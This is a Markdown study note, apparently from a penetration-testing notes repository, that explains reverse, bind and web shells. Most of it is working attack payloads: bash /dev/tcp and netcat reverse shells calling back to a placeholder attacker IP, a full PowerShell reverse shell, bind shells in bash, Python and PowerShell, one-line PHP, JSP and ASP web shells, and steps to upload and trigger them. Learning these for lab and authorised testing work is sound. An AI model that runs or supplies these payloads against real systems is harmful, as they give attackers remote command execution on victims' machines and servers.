 *[Image: Banner]*

# 🔧 **Type of Shells**

## 1. 🔄 Reverse Shell

  In a reverse shell, the target machine connects back to the attacker’s machine, giving the attacker control.

- **Working:** Attacker sets up a listener; the victim initiates the connection.

- **Use:** Bypassing firewalls (since outgoing connections are often allowed).

- **Example flow:**
  
  The first step is to setup a listner (e.g. netcat listener) on a port of your choosing:

      `nc -lvnp <PORT> `

  Next step is choosing the shell according to the envirnment and services. We can use to get a reverse connection, for bash on Linux compromised hosts and Powershell on Windows compromised hosts:
  
  > Linux (bash):
   
       `bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<Port> 0>&1'`
  > Linux (bash):

      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f`
  
  > Windows (powershell):
  
      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`

## 2. 🔗 Bind Shell
  
  In a bind shell, the target machine opens a port and listens for incoming connections from the attacker.
  
- **Working:** The victim machine opens a port and listens; the attacker connects to it to gain a shell.
  
- **Use:** Simple to set up in unrestricted environments, but less useful behind firewalls or NAT, since incoming connections may be blocked.

- **Example flow:**

    First, the victim runs a bind shell command on their system. The shell listens on a port (e.g. 0-65535) and waits for an attacker to connect.

  > Linux (bash):

      `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp <Port> > /tmp/f`
  
  > Linux (Python):

      `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept(); while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`

  > Windows (PowerShell):

      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + " "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();`

    Once the victim sets the bind shell, attacker can connect like this:

       nc <victim_ip> <Port>
  
    If successful, this gives the attacker an interactive shell.
    

## 3. 🌐 Web Shell
  
  A web shell is a malicious script uploaded to a web server (usually PHP, ASP, JSP, etc.). It executes system commands sent through HTTP requests.

- **Working:** The attacker uploads a script (e.g., PHP, ASP) to the victim’s web server. This script executes system commands via a browser interface.

- **Use:** Common in web server exploitation, especially after finding a file upload or RCE vulnerability. Allows remote command execution via HTTP/S.

- **Example flow:**

  Writing the Web Shell:
    > PHP (most common):
    
      `<?php system($_REQUEST["cmd"]); ?>`
    
    > JSP:
    
      `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
    
    > ASP:
    
      `<% eval request("cmd") %>`

  Uploading the Shell:
    If an upload feature is vulnerable:
        We can upload shell.php to /var/www/html/ or equivalent. <br>
    We can also simply upload the shell file(i.e. in my case it's [Web_Shell.php] (https://github.com/en1gm4-exe/HackTheBox/blob/main/Notes%20/%20Shell%20/Web_Shell.php)  ) in any uploading portal where file will be saved eventually to the server files (normally it works..). and after uploading we can get the `cmd` access by using that shell's path.
 
    If we already have RCE:
      
      `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`

    Accessing Web Shell:

      `http://<server_ip>:<port>/shell.php?cmd=id`

# Links for shell generation

> [Powershells cheat sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/powershell-cheatsheet/)

> [Reverse shells cheat sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools)

> [Bind shells cheat sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#python)

> [Shell generator](https://www.revshells.com/)
